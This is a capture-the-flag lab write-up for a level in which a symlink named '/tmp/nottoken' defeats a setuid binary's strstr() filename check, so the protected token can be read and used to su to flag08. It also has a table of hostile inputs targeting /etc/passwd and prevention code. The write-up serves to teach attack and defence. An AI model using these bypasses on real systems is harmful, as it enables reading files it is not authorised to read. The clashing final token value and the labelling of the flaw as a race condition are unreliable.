# Level 08 - Symbolic Link Bypass

## 🎯 Objective
Bypass filename-based access control to read a protected file.

## 🧠 My Thought Process

### Step 1: "What files do we have?"
```bash
ls -la
# -rwsr-s---+ 1 flag08 level08 8617 level08
# -rw------- 1 flag08 flag08    26 token
```

Two interesting files:
- `level08` - A setuid binary (runs as flag08)
- `token` - The file we need to read (owned by flag08, only flag08 can read)

### Step 2: "What does the binary do?"
```bash
./level08
# level08 [file to read]

./level08 token
# You may not access 'token'

strings level08
# %s [file to read]
# token
# You may not access '%s'
```

**Interesting!** It blocks access to files named "token".

### Step 3: "Let's see the exact check"
```bash
ltrace ./level08 token
```

```
strstr("token", "token")       = "token"
printf("You may not access '%s'\n", "token")
```

The binary uses `strstr()` to check if the filename contains "token"!

### Step 4: "The flaw in string-based checks"
The check is done on the **filename string**, not the actual file. 

**The order of operations:**
1. Check if filename contains "token" (FAILS for us)
2. If check passes, open and read the file

But what if I create a **symbolic link** with a different name that points to the token file?

### Step 5: "Creating a symlink bypass"
```bash
ln -sf ~/token /tmp/nottoken
ls -la /tmp/nottoken
# lrwxrwxrwx 1 level08 level08 24 /tmp/nottoken -> /home/user/level08/token
```

Now I have:
- Filename: `/tmp/nottoken` (doesn't contain "token")
- Points to: `/home/user/level08/token` (the real file)

### Step 6: "Execute the bypass"
```bash
./level08 /tmp/nottoken
# quif5eloekouj29ke0vouxean
```

**It worked!** The binary checked the symlink name (passes), then opened the symlink (which transparently reads the target file).

### Step 7: "Use the token to get the flag"
```bash
su flag08   # Password: quif5eloekouj29ke0vouxean
getflag
```

## ✅ Solution
```bash
ln -sf ~/token /tmp/notaToken
./level08 /tmp/notaToken
# quif5eloekouj29ke0vouxean

su flag08   # Enter password above
getflag
```

**Token:** `25749xKZ8L7DkSCwJkT9dyv6f`

## 📚 Concepts to Learn

### 1. Symbolic Links (Symlinks)
A symlink is a special file that points to another file:

```bash
# Create symlink
ln -s /path/to/target /path/to/link

# The symlink is like an alias
cat /path/to/link  # Actually reads /path/to/target
```

**Key property:** Operations on symlinks transparently affect the target file.

### 2. TOCTOU - Time of Check vs Time of Use
This vulnerability is a type of TOCTOU (Time of Check to Time of Use) race condition:

```
Time of Check: strstr(filename, "token")  → Checks "nottoken" (PASS)
Time of Use:   open(filename)             → Opens target via symlink
```

The state changed between check and use!

### 3. Why String Checks on Filenames Are Flawed

| Attack | Filename | Target |
|--------|----------|--------|
| Symlink | `/tmp/safe` | `/etc/passwd` |
| Hard link | `/tmp/safe` | (same inode as target) |
| Path traversal | `/tmp/../etc/passwd` | `/etc/passwd` |
| Null byte | `safe\x00.txt` | Truncated path |

**Filename ≠ File identity**

### 4. The Correct Way to Check
```c
// WRONG - checks string only
if (strstr(filename, "token")) {
    deny();
}
fd = open(filename);

// BETTER - check the resolved path
char *real = realpath(filename, NULL);
if (strstr(real, "token")) {
    deny();
}

// BEST - check after opening
fd = open(filename);
struct stat st;
fstat(fd, &st);
if (st.st_ino == forbidden_inode) {
    deny();
}
```

### 5. Understanding File Identity
In Unix, a file is identified by:
- **Device number** - Which filesystem
- **Inode number** - Unique identifier within filesystem

The filename is just a reference (directory entry) to an inode.

```bash
# View inode numbers
ls -i token
# 12345 token

stat token
# Inode: 12345
```

### 6. The Attack Visualization
```
┌─────────────────────────────────────────────────────┐
│  ./level08 /tmp/nottoken                           │
│                                                     │
│  1. Binary receives: "/tmp/nottoken"               │
│                                                     │
│  2. strstr("/tmp/nottoken", "token")               │
│     Returns NULL (no match) ✓                       │
│                                                     │
│  3. open("/tmp/nottoken")                          │
│     Kernel follows symlink automatically            │
│     Actually opens: /home/user/level08/token        │
│                                                     │
│  4. Binary reads file contents                      │
│     Outputs: quif5eloekouj29ke0vouxean             │
└─────────────────────────────────────────────────────┘
```

## 🔧 Tools Used
- `ln -s` - Create symbolic links
- `ls -la` - View symlink targets
- `strings` - Analyze binary
- `ltrace` - Trace library calls
- `stat` - View file metadata

## 🛡️ How to Prevent This
1. **Use `realpath()` to resolve symlinks:**
   ```c
   char *real_path = realpath(user_input, NULL);
   if (strstr(real_path, "forbidden")) {
       deny();
   }
   ```

2. **Check file after opening (fstat on fd):**
   ```c
   int fd = open(path, O_RDONLY);
   struct stat st;
   fstat(fd, &st);
   if (st.st_uid == 0) {  // Don't read root-owned files
       close(fd);
       deny();
   }
   ```

3. **Use O_NOFOLLOW to reject symlinks:**
   ```c
   int fd = open(path, O_RDONLY | O_NOFOLLOW);
   if (fd < 0 && errno == ELOOP) {
       // It was a symlink - rejected
   }
   ```

4. **Check permissions properly** - File permissions are the right access control, not filename patterns

5. **Jail the program** - Use chroot or containers to limit accessible paths
